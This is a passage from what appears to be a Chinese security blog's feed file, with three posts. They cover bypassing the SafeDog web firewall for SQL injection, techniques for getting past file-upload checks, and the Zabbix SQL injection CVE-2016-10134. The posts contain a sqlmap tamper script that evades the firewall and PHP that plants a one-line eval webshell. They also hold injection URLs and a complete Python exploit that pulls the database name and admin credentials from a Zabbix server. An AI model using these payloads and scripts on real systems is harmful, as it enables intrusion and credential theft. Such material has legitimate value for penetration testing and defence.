title="绕过select from"></a>绕过<code>select from</code></h3><table><thead><tr><th align="center">payload</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">select</td><td align="center">未拦截</td></tr><tr><td align="center">from</td><td align="center">未拦截</td></tr><tr><td align="center">select from</td><td align="center">未拦截</td></tr><tr><td align="center">select 1</td><td align="center">未拦截</td></tr><tr><td align="center">from 1</td><td align="center">拦截</td></tr><tr><td align="center">from1</td><td align="center">未拦截</td></tr></tbody></table><p>说明from后面有空格时会拦截。</p><ol><li><p>使用<code>-+</code>即可绕过（仅适用于from后面跟数字的情况）：<br> <img src="https://raw.githubusercontent.com/handbye/images/master/20191010113333.png" alt="20191010113333.png"></p></li><li><p>使用<code>/*!99999c*//*!99999c*/FROM</code>绕过<br><img src="https://raw.githubusercontent.com/handbye/images/master/20191010164125.png" alt="20191010164125.png"></p></li></ol><h3 id="绕过database"><a href="#绕过database" class="headerlink" title="绕过database()"></a>绕过<code>database()</code></h3><p>使用注释即可绕过：<br><img src="https://raw.githubusercontent.com/handbye/images/master/20191010153612.png" alt="20191010153612.png"></p><h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><p>最后赠送过狗tamper</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>settings <span class="token keyword">import</span> UNICODE_ENCODING__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"/*!*/"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"/*!*/=/*!*/"</span><span class="token punctuation">)</span>        <span class="token comment"># payload=payload.replace('1=1','true')</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token string">"/*!AND/*/**/"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"OR"</span><span class="token punctuation">,</span><span class="token string">"/*!OR/*/**/"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"UNION SELECT"</span><span class="token punctuation">,</span><span class="token string">"UNION--+aaaaaa%0aSELECT"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span><span class="token string">"/*!*/#"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"USER()"</span><span class="token punctuation">,</span><span class="token string">"USER/*!()*/"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"DATABASE()"</span><span class="token punctuation">,</span><span class="token string">"DATABASE/*!()*/"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">,</span><span class="token string">"/*!*/--"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"FROM"</span><span class="token punctuation">,</span><span class="token string">"/*!99999c*//*!99999c*/FROM"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CONCAT"</span><span class="token punctuation">,</span><span class="token string">"/*!12345CONCAT*/"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CAST("</span><span class="token punctuation">,</span><span class="token string">"/*!12345CAST(*/"</span><span class="token punctuation">)</span>        payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CASE"</span><span class="token punctuation">,</span><span class="token string">"/*!12345CASE*/"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://www.key1.top/index.php/archives/255/">Fuzzing—Sql injection bypass with BurpSuite</a></p></li><li><p><a href="https://www.cnblogs.com/R4v3n/articles/9082419.html">安全狗bypass注入</a></p></li><li><p><a href="https://www.yuag.org/2018/11/29/bypass%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">bypass安全狗绕过方法</a></p></li><li><p><a href="http://flag0.com/2018/04/20/bypass%E5%AE%89%E5%85%A8%E7%8B%97/">bypass安全狗</a></p></li><li><p><a href="https://payloads.online/archivers/2018-02-05/1">Fuzzing With FuzzDB to Web Attack</a></p></li><li><p><a href="https://blog.csdn.net/nzjdsds/article/details/77367899">Fuzz安全狗注入绕过</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> bypass方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全狗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传姿势总结</title>
      <link href="2019/08/26/file-upload-sumarry/"/>
      <url>2019/08/26/file-upload-sumarry/</url>
      
        <content type="html"><![CDATA[<h2 id="总体情况"><a href="#总体情况" class="headerlink" title="总体情况"></a>总体情况</h2><p><img src="https://i.loli.net/2019/08/26/suITm38H5xWY6wJ.png" alt="20190826174104.png"></p><h2 id="判断上传漏洞类型"><a href="#判断上传漏洞类型" class="headerlink" title="判断上传漏洞类型"></a>判断上传漏洞类型</h2><p><img src="https://i.loli.net/2019/08/26/ryIfTbvDO6FnzS2.png" alt="20190826174133.png"></p><h2 id="上传绕过方法"><a href="#上传绕过方法" class="headerlink" title="上传绕过方法"></a>上传绕过方法</h2><h3 id="前端JS校验"><a href="#前端JS校验" class="headerlink" title="前端JS校验"></a>前端JS校验</h3><p>1.禁用js<br>2.修改js代码中禁止上传的白名单或黑名单<br>3.抓包改包</p><h3 id="服务端检查文件名后缀"><a href="#服务端检查文件名后缀" class="headerlink" title="服务端检查文件名后缀"></a>服务端检查文件名后缀</h3><p>1.黑名单：<br>    - 上传服务器可解析的其它格式后缀，例如php3,phtml,asa,cer等<br>    - 修改后缀为大写，或者大小写混合<br>    - 后缀名后面加点或者空格<br>    - 后缀名后面加<code>::$DATA</code><br>    - <code>*.php. .</code> (点+空格+点)<br>    - 双写后缀名绕过：当服务器利用函数（如str_ireplace函数）将敏感的后缀名替换为空时，双写后缀名，如<code>.pphphp</code>即可绕过<br>    - 上传.7z压缩包绕过：.7z是一种压缩包文件的格式，我们上传cmd.php.7z文件，再访问该文件时能够正常访问到php页面，这属于Apache解析漏洞，Apache解析文件              时，如果后缀名不认识，则会继续想前解析，会解析到php,这就是Apache的解析漏洞<br>    - 上传图片🐎配合文件包含利用<code>.htaccess</code>文件：内容为<code>SetHandler application/x-httpd-php</code>，上传的所有文件都会被当做php文件进行解析，前提是需要服务器相关配置开启</p><p>2.白名单：<br>    - 上传图片🐎配合文件包含利用<br>    - 0x00截断：原理同%00截断，只不过是通过POST方式传递参数，需要通过Burp在十六进制形式中修改<br>    - 利用%00截断move_uploaded_file函数，只解析%00前的字符，%00后的字符不解析，通常运用在GET方式，因为GET方式传入能自动进行URL解码</p><h3 id="服务端检查文件内容"><a href="#服务端检查文件内容" class="headerlink" title="服务端检查文件内容"></a>服务端检查文件内容</h3><p>1.修文件为图片头标识绕过</p><pre><code><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">JPEG&#x2F;JPG: FF D8PNG: 89 50GIF: 47 49<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></code></pre><p>2.上传图片🐎配合文件包含</p><h3 id="服务器端检查文件内容后重新渲染"><a href="#服务器端检查文件内容后重新渲染" class="headerlink" title="服务器端检查文件内容后重新渲染"></a>服务器端检查文件内容后重新渲染</h3><p>参考：<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p><p>POC地址：<a href="https://github.com/storysec/SecurityStudy/tree/master/upload-labs-pass-16">POC</a></p><h3 id="服务器端会将文件重命名或者重新移动"><a href="#服务器端会将文件重命名或者重新移动" class="headerlink" title="服务器端会将文件重命名或者重新移动"></a>服务器端会将文件重命名或者重新移动</h3><p>代码中先上传再进行验证，发现不合格的文件，客户端返回报错之后，再进行删除。很容易想到条件竞争的利用。<br>使用如下的hack.php</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php fputs(fopen(&quot;.&#x2F;shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;x&quot;]) ?&gt;&#39;); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传hack.php，发现不合格的文件就会被unlink函数删除掉，但在多线程并发的情况下：即多次上传hack.php的同时，多次访问hack.php，就会出现hack.php成功访问执行的情况，即成功写入一句话木马。</p><p>上传后再通过rename函数重命名。我们可以观察这关的白名单中存在压缩包的后缀名</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">var $cls_arr_ext_accepted &#x3D; array(      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们可以利用条件竞争，通过多线程发送上传后缀名为.php.7z的文件的包，当服务器还未来得及将文件改名时访问上传的webshell</p><h3 id="逻辑漏洞绕过"><a href="#逻辑漏洞绕过" class="headerlink" title="逻辑漏洞绕过"></a>逻辑漏洞绕过</h3><p>参考uploads-lab  pass-20</p><h3 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h3><p>1.Apache<br>    - 遇到不认识的后缀名会向前解析</p><p>2.nginx</p><pre><code>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置 SCRIPT_FILENAME。当访问 www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为 “phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPTFILENAME是phpinfo.jpg，而1.php是PATHINFO，所以就会将phpinfo.jpg作为PHP文件来解析了**漏洞形式**：</code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">www<span class="token operator">.</span>xxxx<span class="token operator">.</span>com<span class="token operator">/</span>UploadFiles<span class="token operator">/</span>image<span class="token operator">/</span><span class="token number">1.</span>jpg<span class="token operator">/</span><span class="token number">1.</span>phpwww<span class="token operator">.</span>xxxx<span class="token operator">.</span>com<span class="token operator">/</span>UploadFiles<span class="token operator">/</span>image<span class="token operator">/</span><span class="token number">1.</span>jpg <span class="token operator">%</span><span class="token number">00.</span>phpwww<span class="token operator">.</span>xxxx<span class="token operator">.</span>com<span class="token operator">/</span>UploadFiles<span class="token operator">/</span>image<span class="token operator">/</span><span class="token number">1.</span>jpg<span class="token operator">/</span><span class="token operator">%</span><span class="token number">20</span>\<span class="token number">0.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.IIS</p><ul><li><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p></li><li><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p><p> 目录解析(6.0)</p><p>　 形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a> 原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。</p><p>　 形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a> 原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型</p><p>　 IIS6.0 默认的可执行文件除了asp还包含这三种 : asa, cer, cdx</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://foxgrin.github.io/posts/49857/">https://foxgrin.github.io/posts/49857/</a></li><li><a href="https://github.com/storysec/SecurityStudy/tree/master/upload-labs-pass-16">https://github.com/storysec/SecurityStudy/tree/master/upload-labs-pass-16</a></li><li><a href="http://www.storysec.com/upload-labs.html#h2-6">http://www.storysec.com/upload-labs.html#h2-6</a></li><li><a href="https://paper.seebug.org/560/">https://paper.seebug.org/560/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zabbix SQL注入（CVE-2016-10134）</title>
      <link href="2019/08/03/zabbix-sql-injection/"/>
      <url>2019/08/03/zabbix-sql-injection/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是zabbix"><a href="#什么是zabbix" class="headerlink" title="什么是zabbix"></a>什么是zabbix</h2><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。</p><p>zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p><p>zabbix由2部分构成，zabbix server与可选组件zabbix agent。</p><p>zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。</p><blockquote><p>2016年8月12日，1n3通过邮件披露了Zabbix软件的jsrpc.php文件在处理profileIdx2参数时存在insert方式的SQL注入漏洞，与官方通告的latest.php文件在处理toggle_ids参数时存在insert方式的SQL注入漏洞属于同一类型的漏洞，只是攻击的位置不同。</p></blockquote><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>ZABBIX 2.0.5 2.0.13 2.2.x 2.4.2 2.4.5 2.4.7 2.4.8 2.5.0 3.0.0-3.0.3</p><h2 id="不受影响的版本"><a href="#不受影响的版本" class="headerlink" title="不受影响的版本"></a>不受影响的版本</h2><p><code>ZABBIX 1.8.*，2.2.14，3.0.4，3.2.0</code></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>注入在两个页面中都存在，分别进行验证。</p><ol><li>latest.php页面：</li></ol><p>此页面需要使用已注册用户或者guest用户登陆才可以。</p><p><img src="https://i.loli.net/2019/08/03/vg8f2L9JGsqyHmn.png" alt="360截图17860602117118155.png"></p><p>使用guest用户登陆，查看cookie中的zbx_sessionid</p><p><img src="https://i.loli.net/2019/08/03/g6hn3sbmDvH1FkT.png" alt="360截图18270619509391.png"></p><p>此页面注入的payload为：</p><blockquote><p><code>http://ip:port/latest.php?output.php=ajax&amp;sid=**&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids=updatexml(0,concat(0xa,database()),0)</code></p></blockquote><p>需要将zbx_sessionid中的后16位拿出来放到sid后面</p><p><img src="https://i.loli.net/2019/08/03/hyX7G4bCHduNIKr.png" alt="20190803142503.png"></p><p>可看到已经注入成功，将数据库名显示了出来。</p><ol start="2"><li>jsrpc.php页面:</li></ol><p>此页面无需登陆即可注入</p><p>zabbix 3.0.4版本已经修复了latest.php页面的注入，但不清楚是否已修复jsrpc.php页面的注入，遇到3.0.4版本也可尝试进行注入。</p><p>此页面注入的poc为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//192.168.223.130:8080/jsrpc.php</span><span class="token operator">?</span>sid<span class="token operator">=</span><span class="token number">0</span>bcd4ade648214dc<span class="token operator">&amp;</span>type<span class="token operator">=</span><span class="token number">9</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>screen<span class="token operator">.</span>get<span class="token operator">&amp;</span>timestamp<span class="token operator">=</span><span class="token number">1471054088083</span><span class="token operator">&amp;</span>mode<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>screenid<span class="token operator">=</span><span class="token operator">&amp;</span>groupid<span class="token operator">=</span><span class="token operator">&amp;</span>hostid<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>pageFile<span class="token operator">=</span>history<span class="token operator">.</span>php<span class="token operator">&amp;</span>profileIdx<span class="token operator">=</span>web<span class="token operator">.</span>item<span class="token operator">.</span>graph<span class="token operator">&amp;</span>profileIdx2<span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">&amp;</span>updateProfile<span class="token operator">=</span><span class="token constant boolean">true</span><span class="token operator">&amp;</span>screenitemid<span class="token operator">=</span><span class="token operator">&amp;</span>period<span class="token operator">=</span><span class="token number">3600</span><span class="token operator">&amp;</span>stime<span class="token operator">=</span><span class="token number">20170813040734</span><span class="token operator">&amp;</span>resourcetype<span class="token operator">=</span><span class="token number">17</span><span class="token operator">&amp;</span>itemids<span class="token punctuation">[</span><span class="token number">23297</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">23297</span><span class="token operator">&amp;</span>action<span class="token operator">=</span>showlatest<span class="token operator">&amp;</span>filter<span class="token operator">=</span><span class="token operator">&amp;</span>filter_task<span class="token operator">=</span><span class="token operator">&amp;</span>mark_color<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注入点在profileIdx2参数</p><p>测试如下：</p><p><img src="https://i.loli.net/2019/08/03/UZtOIXlsJWDh2ib.png" alt="20190803172227.png"></p><p>同样可构造注入语句显示数据库名：</p><p><img src="https://i.loli.net/2019/08/03/yLG9Zc6O3E5UqrR.png" alt="20190803172436.png"></p><h2 id="利用EXP"><a href="#利用EXP" class="headerlink" title="利用EXP"></a>利用EXP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding= utf-8</span><span class="token keyword">import</span> sys<span class="token punctuation">,</span>re<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">sql_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    poc <span class="token operator">=</span> <span class="token string">"/jsrpc.php?sid=0bcd4ade648214dc"</span> \          <span class="token string">"&amp;type=9"</span> \          <span class="token string">"&amp;method=screen.get"</span> \          <span class="token string">"&amp;timestamp=1471054088083&amp;mode=2"</span> \          <span class="token string">"&amp;screenid="</span> \          <span class="token string">"&amp;groupid=&amp;hostid=0"</span> \          <span class="token string">"&amp;pageFile=history.php"</span> \          <span class="token string">"&amp;profileIdx=web.item.graph"</span> \          <span class="token string">"&amp;profileIdx2=2’3297"</span> \          <span class="token string">"&amp;updateProfile=true"</span> \          <span class="token string">"&amp;screenitemid=&amp;period=3600"</span> \          <span class="token string">"&amp;stime=20170813040734"</span> \          <span class="token string">"&amp;resourcetype=17"</span> \          <span class="token string">"&amp;itemids%5B23297%5D=23297"</span> \          <span class="token string">"&amp;action=showlatest"</span> \          <span class="token string">"&amp;filter="</span> \          <span class="token string">"&amp;filter_task="</span> \          <span class="token string">"&amp;mark_color=1"</span>    request_url <span class="token operator">=</span> zabbix_url<span class="token operator">+</span>poc    <span class="token keyword">try</span><span class="token punctuation">:</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>request_url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> rsp<span class="token punctuation">.</span>text        keyWord <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"INSERT\s*INTO\s*profiles"</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span>        <span class="token keyword">if</span> keyWord<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"此地址存在注入"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"此地址不存在注入，无法利用"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"(select database())"</span>    poc <span class="token operator">=</span> <span class="token string">"/jsrpc.php?sid=0bcd4ade648214dc"</span> \          <span class="token string">"&amp;type=9"</span> \          <span class="token string">"&amp;method=screen.get"</span> \          <span class="token string">"&amp;timestamp=1471054088083&amp;mode=2"</span> \          <span class="token string">"&amp;screenid="</span> \          <span class="token string">"&amp;groupid=&amp;hostid=0"</span> \          <span class="token string">"&amp;pageFile=history.php"</span> \          <span class="token string">"&amp;profileIdx=web.item.graph"</span> \          <span class="token string">"&amp;profileIdx2="</span><span class="token operator">+</span>payload<span class="token operator">+</span> \          <span class="token string">"&amp;updateProfile=true"</span> \          <span class="token string">"&amp;screenitemid=&amp;period=3600"</span> \          <span class="token string">"&amp;stime=20170813040734"</span> \          <span class="token string">"&amp;resourcetype=17"</span> \          <span class="token string">"&amp;itemids%5B23297%5D=23297"</span> \          <span class="token string">"&amp;action=showlatest"</span> \          <span class="token string">"&amp;filter="</span> \          <span class="token string">"&amp;filter_task="</span> \          <span class="token string">"&amp;mark_color=1"</span>    url <span class="token operator">=</span> zabbix_url <span class="token operator">+</span> poc    <span class="token keyword">try</span><span class="token punctuation">:</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> rsp<span class="token punctuation">.</span>text        keyword <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'Incorrect.*?(\S+)\s*for'</span><span class="token punctuation">,</span>r<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据库名称为："</span> <span class="token operator">+</span> keyword<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUserPass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"(select 1 from(select count(*),"</span> \              <span class="token string">"concat((select (select (select concat(0x7e,(select concat(alias,0x3a,passwd) "</span> \              <span class="token string">"from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from "</span> \              <span class="token string">"information_schema.tables group by x)a)"</span>    poc <span class="token operator">=</span> <span class="token string">"/jsrpc.php?sid=0bcd4ade648214dc"</span> \          <span class="token string">"&amp;type=9"</span> \          <span class="token string">"&amp;method=screen.get"</span> \          <span class="token string">"&amp;timestamp=1471054088083&amp;mode=2"</span> \          <span class="token string">"&amp;screenid="</span> \          <span class="token string">"&amp;groupid=&amp;hostid=0"</span> \          <span class="token string">"&amp;pageFile=history.php"</span> \          <span class="token string">"&amp;profileIdx=web.item.graph"</span> \          <span class="token string">"&amp;profileIdx2="</span> <span class="token operator">+</span> payload <span class="token operator">+</span> \          <span class="token string">"&amp;updateProfile=true"</span> \          <span class="token string">"&amp;screenitemid=&amp;period=3600"</span> \          <span class="token string">"&amp;stime=20170813040734"</span> \          <span class="token string">"&amp;resourcetype=17"</span> \          <span class="token string">"&amp;itemids%5B23297%5D=23297"</span> \          <span class="token string">"&amp;action=showlatest"</span> \          <span class="token string">"&amp;filter="</span> \          <span class="token string">"&amp;filter_task="</span> \          <span class="token string">"&amp;mark_color=1"</span>    url <span class="token operator">=</span> zabbix_url<span class="token operator">+</span>poc    <span class="token keyword">try</span><span class="token punctuation">:</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> rsp<span class="token punctuation">.</span>text        keyword <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'Duplicate.*?(\S+)\s*for'</span><span class="token punctuation">,</span>r<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"用户名和密码为："</span> <span class="token operator">+</span> keyword<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span><span class="token number">60</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t CVE-2016-10134'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t Zabbix SQL injection EXP'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t by https://darkless.cn'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t python>=3.5 and usage "python zabbix-sql-inject-exp.py"'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*'</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>    zabbix_url <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入zabbix地址，例如：http://192.168.0.1:8080 >>>>"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> zabbix_url<span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    sql_check<span class="token punctuation">(</span><span class="token punctuation">)</span>    get_database<span class="token punctuation">(</span><span class="token punctuation">)</span>    getUserPass<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.waitalone.cn/zabbix-sql-1.html">https://www.waitalone.cn/zabbix-sql-1.html</a></li><li><a 